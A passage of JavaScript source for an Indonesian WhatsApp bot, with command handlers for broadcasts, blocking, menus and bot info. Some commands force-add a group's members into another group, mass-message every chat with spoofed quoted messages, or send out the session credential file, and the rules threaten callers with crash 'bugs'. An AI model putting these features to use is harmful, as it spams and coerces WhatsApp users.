let ana = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
let buff = await getBuffer(ana.screenshot)
await Fan.sendMessage(from, {caption : `Link: ${teks}`, image: buff}, {quoted: setQuoted})
}
break
case 'readmore':{
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
if (!q.includes('|')) return setReply("Penggunaan teks| teks")
const text1 = q.substring(0, q.indexOf('|') - 0)
const text2 = q.substring(q.lastIndexOf('|') + 1)
setReply(`${text1}${readmore}${text2}`)
}
break
case 'infobotz':{       
var groups = totalchat.filter(v => v.endsWith('g.us'))
var privat = totalchat.filter(v => v.endsWith('s.whatsapp.net'))
var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
var ram3 =`${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}`
let uptime = process.uptime();
const timestampu = speed();
var total = math(`${groups.length} ${privat.length}`)
var wa_version = Fan.waVersion
var mcc = "Error"
var mnc = "Error"
var os_version = "Error"
var device_manufacturer = "Error"
var device_model = "Error"
let gender ="Female"
let nomerOwner =`Ownerin.split("@")[0]`
let menunya =`
「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」

*▸* Nama : ${botName}
*▸* Gender : ${gender}
*▸* Private Chat : ${privat.length}
*▸* Group Chat : ${groups.length}
*▸* Total Chat : ${totalchat.length}
*▸* Speed : ${latensi.toFixed(4)} second
*▸* Penggunaan Ram : ${ram2}
*▸* Hostname : ${os.hostname()}
*▸* Platform : ${os.platform()}
*▸* Device Model: ${device_model}
*▸* Device Manufactur : ${device_manufacturer}
*▸* Wa Version: ${wa_version}
*▸* Os Version: ${os_version}
*▸* Owner : ${nomerOwner}
*▸* Tgl pembuatan : 25 Juli 2021
*▸* Tgl release : 29 September 2021
*▸* Tgl sekarang : ${calender}
*▸* Image : Girl Front Line G11
*▸* Voice : Nina kawai

*▸* SCRIPT BY
   Decode Denpa
   X-Dev Team
   Yogi PW
   Hexagon
   Dttaz

*▸* FEATURE  BY  
   Decode Denpa
   Fernazer
   X-Dev Team
   Resta Gamteng
   Zeeone Ofc
   X-Dev Team
   Yudha perdana
   Xchilds
   Dika Ardnt
`
let info = ofrply
let options2 = {contextInfo: { forward, externalAdReply:{title:`${ucapanWaktu} ${pushname}`,body:`*click here to play music`,mediaType:"2",infringementnail: ofrply, mediaUrl:`https://www.instagram.com/reel/CZ2bMRkgHCR/?utm_medium=copy_link`}}}
let gbutsan = [{buttonId: 'YOUTUBE', buttonText: {displayText: `ʏᴏᴜᴛᴜʙᴇ`}, type: 1},
{buttonId: 'RULES', buttonText: {displayText: `ʀᴜʟᴇs`}, type: 1}]         
Fan.sendButImage(from, menunya, fake, ofrply, gbutsan)      
} 
break
case 'rules':{
let teks =`
Syarat dan Ketentuan menggunakan *${botName}*

1. Nama dan nomer user ${botName}
     akan Kami simpan di dalam 
     server selama bot aktif
     
2. Data akan di hapus ketika bot Offline
     atau di hapus oleh Owner Bot

3. Kami tidak menyimpan gambar, 
     video, file, audio, dan dokumen 
     yang kamu kirim ke ${botName}
     
4. Kami tidak akan pernah meminta users 
     untuk memberikan informasi pribadi
     
5. Jika menemukan Bug/Error silahkan 
     langsung lapor ke Owner atau Developer
     atau bisa juga memakai fitur _*reportbug*_
     
6. Beberapa fitur mungkin ada yang error, 
     jadi tunggu sampai developer 
     meperbaiki fitur tersebut
         
8. Bot ini sudah di lengkapi dengan
     fitur _*Auto Report Bug*_ jika terjadi
     error maka bot akan auto report ke
     developer, terkecuali error yang
     menyebabkan bot mati, maka user
     harus lapor ke developer
     
7. Bot ini juga sudah di lengkapi dengan 
     Fitur Anti Spam jika kamu terdeteksi 
     melakukan spam, maka Bot tidak
     akan menanggapi kamu selama 20 detik
    
9. User dilarang keras menelpon bot!
     jika melanggar maka kamu akan terkena 
     banned,block dan dikirim bug

10. Bot tidak akan menanggapi user yang
       meminta untuk di save nomernya`

let mok = [
{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
{"buttonId": `${prefix}dashboard`,"buttonText": {"displayText": `ᴅᴀsʜʙᴏᴀʀᴅ`},"type": "RESPONSE"}]                   
Fan.sendButImage(from, teks, fake, ofrply, mok, {quoted: setQuoted})             
}
break  
case 'kalkulator':
const matematik = require('mathjs')
try{
let nana = q.replace("x","*")
let nunu = matematik.evaluate(nana)
let teks = `${q} = ${nunu}`
setReply(teks)
} catch (err){
setReply( 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
break
case 'react': {
if (!q) return setReply(`Contoh ${prefix+command} 😝`)
let reactionMessage = {
react: {
text: args[0],
key: { remoteJid: from, fromMe: true, id: quoted.id }
}
}
Fan.sendMessage(from, reactionMessage)
}
break
case 'listgc': {
if (!isOwner && !itsMe) return onlyOwner()
let getGroups = await Fan.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
for (let i of anu) {
let metadata2 = await Fan.groupMetadata(i)
teks += `◉ Nama : ${metadata2.subject}\n◉ Owner : ${metadata2.owner !== undefined ? '@' + metadata2.owner.split`@`[0] : 'Tidak diketahui'}\n◉ ID : ${metadata2.id}\n◉ Dibuat : ${moment(metadata2.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
Fan.sendTextWithMentions(from, teks, setQuoted)
}
break
case 'listpc': {
if (!isOwner && !itsMe) return onlyOwner()
let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
for (let i of anu) {
let nama = store.messages[i].array[0].pushName
teks += `◉ Nama : ${nama}\n◉ User : @${i.split('@')[0]}\n◉ Chat : https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
}
Fan.sendTextWithMentions(from, teks, setQuoted)
}
break       
//━━━━━━━━━━━━━━━[ OWNER ]━━━━━━━━━━━━━━━━━//
case 'join':{
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply(`Kirim perintah ${command} _linkgrup_`)
var url = args[1]
let ano = q.split('https://chat.whatsapp.com/')[1]
await Fan.groupAcceptInvite(ano)
setReply("Sukses join group")
}
break
case 'bc': 
if (!isOwner && !itsMe) return onlyOwner()
if (args.length < 2) return setReply(`Masukkan isi pesannya`)
var data = await store.chats.all()
for (let i of data) {
await Fan.sendMessage(i.id, { text: `${q}\n\n_*BROADCAST MESSAGE*_` })
await sleep(1000)
}
break
case 'bcgc':{
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply('Teksnya?')
const delay = time => new Promise(res => setTimeout(res, time))
let getGroups = await Fan.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anus = groupss.map(v => v.id)
if (!q) return setReply('teksnya?')
setReply(`Mengirim Broadcast Ke ${anus.length} Chat, Waktu Selesai ${anus.length * 0.5 } detik`)
let yesnih = [
{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
{"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
let teks = `*BROADCAST GROUP*\n\n${q}`
if (isImage || isQuotedImage) { //Image
let buff = await Fan.downloadAndSaveMediaMessage(quoted)
//let buffer = fs.readFileSync(file)
for (let i of anus) {
await delay(1000)
await Fan.sendMessage(i, {caption: teks, image: fs.readFileSync(buff)}, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 10000, status: 200, jpegThumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}})
}
fs.unlinkSync(buff)
} else  if (isVideo || isQuotedVideo) { //Video
let buff = await Fan.downloadAndSaveMediaMessage(quoted)
for (let i of anus) {
await delay(1000)
await Fan.sendMessage(i, {caption: teks, video: buff}, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 10000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}})
}
fs.unlinkSync(buff)
} else if (isAudio || isQuotedAudio) { //Audio
let buff = await Fan.downloadAndSaveMediaMessage(quoted)
for (let i of anus) {
await delay(1000)
await Fan.sendMessage(i, {caption: teks, audio: buff}, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 10000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}})
}
fs.unlinkSync(buff)
} else {
for (let i of anus) {
await delay(1000)
await Fan.sendButLoc(i, teks,fake,ofrply, yesnih)
}
}
setReply(`Sukses Mengirim Broadcast Ke ${anus.length} Group`)
}
break
case 'get':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply("*Mau nyari Case apa kak*") 
let nana = await getCase(q)
setReply(nana)
break
case 'getsesi':{
if (!isOwner && !itsMe) return onlyOwner()
await setReply(`Getting File`)
let sesi = await fs.readFileSync(`./${sessionName}.json`)
await Fan.sendMessage(from, { document: sesi, mimetype: 'application/json', fileName: `${sessionName}.json` }, { quoted: setQuoted })
}
break
case 'out': case 'leave':
if (!isGroup) return onlyGroup() 
if (!isOwner && !itsMe) return onlyOwner()
await Fan.groupLeave(from)
break
case 'block':
if (!isOwner && !itsMe) return onlyOwner()
if (isGroup){
if (users){
await Fan.updateBlockStatus(users, "block")
setReply(`Sukses block user`)
} else {
setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
await Fan.updateBlockStatus(woke, "block")
} else if(!q){
setReply("Masukan nomer yang ingin di block")
}
}
setReply(`Berhasil Block user ${woke.split("@")[0]}`)
break
case 'unblock':
if (!isOwner && !itsMe) return onlyOwner()
if(isGroup){
if(users){
await Fan.updateBlockStatus(users, "unblock")
await setReply(`Sukses unblock user`)
} else if(!q){
setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
await Fan.updateBlockStatus(woke, "unblock")
} else if(!q){
setReply("Masukan nomer yang ingin di unblock")
}
}
break
case 'blockcmd':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
if (checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut sudah ada di database`)
addblockcmd(q,listcmdblock)         
setReply(`Berhasil memblokir command 「 *${q}* 」\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)          
break
case 'unblockcmd':
try{
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply("Textnya mana cih")
if (!checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut tidak ada di database`)
deleteblockcmd(q, listcmdblock)        
setReply(`Berhasil unblock command 「 *${q}* 」`)
} catch (err) {
setReply("Bjirr error, keknya ada yang error")
}
break             
case 'chat': {
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply( 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete')
if (args[0] === 'mute') {
Fan.chatModify({ mute: 'Infinity' }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'unmute') {
Fan.chatModify({ mute: null }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'archive') {
Fan.chatModify({  archive: true }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'unarchive') {
Fan.chatModify({ archive: false }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'read') {
Fan.chatModify({ markRead: true }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'unread') {
Fan.chatModify({ markRead: false }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'delete') {
Fan.chatModify({ clear: { message: { id: mek.quoted.id, fromMe: true }} }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (q.startsWith("+") || q.startsWith('08') || q.startsWith('62') ){
if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62') 
var nomor = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") 
var org = q.split("|")[1];
Fan.sendMessage(nomor+'@s.whatsapp.net',{text: org})   
setReply(`Sukses mengirim chat:\n${org} ke nomer ${nomor}`)           
}
}
break
case 'autolevel':{
if (!isOwner && !itsMe) return onlyOwner()
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (autoLevel) return setReply('Sudah aktif kak')
autoLevel = true
setReply("Sukses mengaktifkan auto level!");
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!autoLevel) return setReply('Sudah Mati')
autoLevel = false
setReply("Sukses mematikan auto level!");
} else if (!q) {
Fan.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}autolevel on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}autolevel off`, buttonText: { displayText: Off },type: 1}],setQuoted);
}
}
break;
case 'autorespon':
if (!isOwner && !itsMe) return onlyOwner()
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (autorespon === true) return setReply('Udah aktif kak')
autorespon = true
let ih =`Mode auto respon telah aktif kak \nBot akan auto respon saat di chat`
setReply(ih) 
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (autorespon === false) return setReply('Udah off kak')
autorespon = false
let eh =`Mode auto respon telah di matikan`
setReply(eh) 
}else if (!q) {
Fan.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}autorespon on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}autorespon off`, buttonText: { displayText: Off },type: 1}]);
}
break;
case 'autosticker':
if (!isOwner && !itsMe) return onlyOwner()
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (autoSticker === true) return setReply('Udah aktif kak')
autoSticker = true
let ih =`Mode auto ${command} telah aktif kak`
setReply(ih) 
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (autoSticker === false) return setReply('Udah off kak')
autoSticker = false
let eh =`Mode auto ${command} telah di matikan`
setReply(eh) 
}else if (!q) {
Fan.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}autosticker on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}autosticker off`, buttonText: { displayText: Off },type: 1}]);
}
break;
case 'autovn':
if (!isOwner && !itsMe) return onlyOwner()
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (autovn === true) return setReply('Udah aktif kak')
autovn = true
let ih =`Mode auto ${command} telah aktif kak`
setReply(ih) 
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (autovn === false) return setReply('Udah off kak')
autovn = false
let eh =`Mode auto ${command} telah di matikan`
setReply(eh) 
}else if (!q) {
Fan.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}autovn on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}autovn off`, buttonText: { displayText: Off },type: 1}]);
}
break
case 'orquoted':
if (!isOwner && !itsMe) return onlyOwner()
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (orquoted === false) return setReply('Udah aktif kak')
orquoted = false
let ih =`Mode ${command} telah aktif kak`
setReply(ih) 
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (orquoted === true) return setReply('Udah off kak')
orquoted = true
let eh =`Mode ${command} telah di matikan`
setReply(eh) 
}else if (!q) {
Fan.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}orquoted on`, buttonText: { displayText: 'false' },type: 1},
{buttonId: `${prefix}orquoted off`, buttonText: { displayText: 'true' },type: 1}]);
}
break
case 'addlimit': 
case 'giftlimit': 
case 'givelimit': 
case 'kasihlimit':
if (!isOwner) return onlyOwner()
if (!q) return setReply(`Format salah!\nCONTOH :\n ${prefix + command} ${nomerOwner} jumlah`)      
if (mentionByReply) {
tambahLimit(mentionByReply, parseInt(args[0]))         
setReply(`Berhasil Add limit : ${args[0]}\nNo : ${mentionByReply.split("@")[0]}`)
} else if(mentionByTag && isGroup) { 
tambahLimit(mentionByTag[0], parseInt(args[1]))         
await setReply(`Berhasil Add limit : ${args[1]}\nNo : ${mentionByTag[0].split("@")[0]}`)
} else if(!isGroup){
tambahLimit(`${args[0]}@s.whatsapp.net`, parseInt(args[1]))
await setReply(`Berhasil Add limit : ${args[1]}\nNo : ${args[0]}️`)
} else setReply("Tag atau Reply usernya")
break




case 'kontak':
if (!q) return setReply(`Format salah!\nCONTOH :\n ${prefix + command} ${nomerOwner} ${ownerName}`)      
if (mentionByReply) {
Fan.sendKontak(from, `${mentionByReply.split("@")[0]}`, `${args[0]}`)     
} else if(mentionByTag && isGroup) { 
Fan.sendKontak(from, `${mentionByTag[0].split("@")[0]}`, `${args[1]}`)          
} else if(!isGroup){
Fan.sendKontak(from, `${args[0]}`, `${args[1]}`)
} else setReply("Tag atau Reply usernya")
break

case 'peler':
let peler1 = `Hai kamu menerima pesan rahasia nih

Isi Pesan : 
Sejak aku melihatmu tuk pertama kali, aku merasakan getaran yang berbeda. Betapa aku tak menyadarinya. Namun, setelah kesekian kali aku melihatmu, aku sadar, selama ini aku menyimpan rasa sama kamu. Rasanya seperti ada yang hilang jika sehari saja ga melihat kamu.

Kamu harus tahu, betapa senangnya aku, jika tatap mata ini berbalas. Bukan hanya itu, aku juga suka tawamu, candamu dan senyumanmu itu. Kalau boleh, betapa aku menyukai semua yang ada pada dirimu. Setiap saat yang ada dipikiranku cuma kamu seorang. Bukan pak Tatang guru matematika itu… suer, hehe

${args[0]} yang manis,
Sungguh tak tahan rasanya menyimpan rasa ini terus menerus. Memendam perasan ternyata lebih sakit dari apapun. Aku tidak bisa menahan semua ini. Karena itu, aku ingin bilang, AKU MENYUKAIMU. Ini sebuah kejujuran, bukan rayuan gombal seperti kata Judika, jebolan Indonesian Idol itu. Maukah kamu jadi Cewek-ku? Maukah kamu mengatakan hal yang sama denganku?

${args[0]} yang imut…
`
let peler2 = `Hai kamu menerima pesan rahasia nih

Isi Pesan : 
Sejak aku melihatmu tuk pertama kali, aku merasakan getaran yang berbeda. Betapa aku tak menyadarinya. Namun, setelah kesekian kali aku melihatmu, aku sadar, selama ini aku menyimpan rasa sama kamu. Rasanya seperti ada yang hilang jika sehari saja ga melihat kamu.

Kamu harus tahu, betapa senangnya aku, jika tatap mata ini berbalas. Bukan hanya itu, aku juga suka tawamu, candamu dan senyumanmu itu. Kalau boleh, betapa aku menyukai semua yang ada pada dirimu. Setiap saat yang ada dipikiranku cuma kamu seorang. Bukan pak Tatang guru matematika itu… suer, hehe

${args[1]} yang manis,
Sungguh tak tahan rasanya menyimpan rasa ini terus menerus. Memendam perasan ternyata lebih sakit dari apapun. Aku tidak bisa menahan semua ini. Karena itu, aku ingin bilang, AKU MENYUKAIMU. Ini sebuah kejujuran, bukan rayuan gombal seperti kata Judika, jebolan Indonesian Idol itu. Maukah kamu jadi Cewek-ku? Maukah kamu mengatakan hal yang sama denganku?

${args[1]} yang imut…
`
Fan.sendButMessage(Pe, peler1, fake, [
{buttonId: `kentod`, buttonText: { displayText: `bales pesan\nhttps://wa.me/${senderNumber}`},type: 1}],setQuoted);
setReply(`Sukses mengirim chat\n ke nomer ${Pe.split("@")[0]}`)
break


              









case 'culik':
if (!isOwner && !itsMe) return onlyOwner()
if (args.length < 1) return setReply('_*Masukin id grupnya tolol*_')
let pantek = []
for (let i of groupMembers) {
console.log(i.id)
await pantek.push(i.id)
}
await Fan.groupParticipantsUpdate(q, pantek, 'add')
break	
case 'shutdown':
if (!isOwner && !itsMe) return onlyOwner()
await setReply('Okey')
return await Fan.sendMessage(from, JSON.stringify(eval(process.exit())))
break
case 'restart':
if (!isOwner && !itsMe) return onlyOwner()
await setReply(`_Restarting ${botName}_`)
exec(`cd && node index`)
await sleep(4000)
setReply('Sukses')
break
//━━━━━━━━━━━━━━━[ SETTING BOT ]━━━━━━━━━━━━━━━━━//
case 'console':{
if (!isOwner && !itsMe) return onlyOwner()
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (Console === true) return setReply('Udah aktif kak')
Console = true
let ih =`Tampilan console telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
 if (Console === false) return setReply('Udah off kak')
Console = false
let eh =`Mode auto respon telah di matikan`
setReply(eh)
}else if (!q) {
Fan.sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}console on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}console off`, buttonText: { displayText: Off },type: 1}]);
}
}
break
case 'public':
if (!isOwner && !itsMe) return onlyOwner()
if (publik) return setReply('Udah di mode publick kak')
publik = true
let bab =`Mode public aktif kak`
setReply(bab)
break           
case 'self':
if (!isOwner && !itsMe) return onlyOwner()
if (!publik) return setReply('Udah di mode self kak')
publik = false
let breh =`Mode self aktif kak`
setReply(breh)
break
case 'setmenu':
if (!isOwner && !itsMe) return onlyOwner()
if ((args[0]) === 'lokasi2'|| (args[0]) === 'prolocation2' ){
setmenu = "location2"
await Fan.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'image'|| (args[0]) === 'img' ){
setmenu = "image"
await Fan.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'lokasi' ){
setmenu = "location"
await Fan.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'katalog' ){
setmenu = "katalog"
await Fan.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'image2'|| (args[0]) === 'img2' ){
setmenu = "image2"
await Fan.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'document'){
setmenu = "document"
await Fan.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'gif'){
setmenu = "gif"
await Fan.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
}  else if (!q) {
Fan.sendButMessage(from, `SETTING MENU\n1.lokasi\n2.lokasi2\n3.img\n4.document\n5.gif`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setmenu document`, buttonText: {displayText: `DOCUMENT`},type: 1},
{buttonId: `${prefix}setmenu image`, buttonText: {displayText: `IMAGE`},type: 1},
{buttonId: `${prefix}setmenu lokasi`, buttonText: { displayText: `LOCATION`},type: 1}],setQuoted);
} else {
setReply("Menu tidak di temukan om")
}
break
case 'settextmenu':
if (!isOwner && !itsMe) return onlyOwner()
if ((args[0]) === 'menu1' ){
textMenu = "menu1"
await Fan.sendButMessage(from, `Berhasil mengubah tampilan text menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'menu2' ){
textMenu = "menu2"
await Fan.sendButMessage(from, `Berhasil mengubah tampilan text menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'menu3'){
textMenu = "menu3"
await Fan.sendButMessage(from, `Berhasil mengubah tampilan text menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
}  else if (!q) {
Fan.sendButMessage(from, `SETTING TEXT MENU\n1.menu1\n2.menu2\n3.menu3`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}settextmenu menu1`, buttonText: { displayText: `MENU1`},type: 1},
{buttonId: `${prefix}settextmenu menu2`, buttonText: { displayText: `MENU2`},type: 1},
{buttonId: `${prefix}settextmenu menu3`, buttonText: { displayText: `MENU3`},type: 1}],setQuoted);
} else {
setReply("Text Menu tidak di temukan om")
}
break
case 'settextfitur':
if (!isOwner && !itsMe) return onlyOwner()
if ((args[0]) === 'fitur1' ){
textFitur = "fitur1"
await Fan.sendButMessage(from, `Berhasil mengubah tampilan text fitur ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'fitur2' ){
textFitur = "fitur2"
await Fan.sendButMessage(from, `Berhasil mengubah tampilan text fitur ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'fitur3'){
textFitur = "fitur3"
await Fan.sendButMessage(from, `Berhasil mengubah tampilan text fitur ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
}  else if (!q) {
Fan.sendButMessage(from, `SETTING TEXT FITUR\n1.fitur1\n2.fitur2\n3.fitur3`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}settextfitur fitur1`, buttonText: { displayText: `FITUR1`},type: 1},
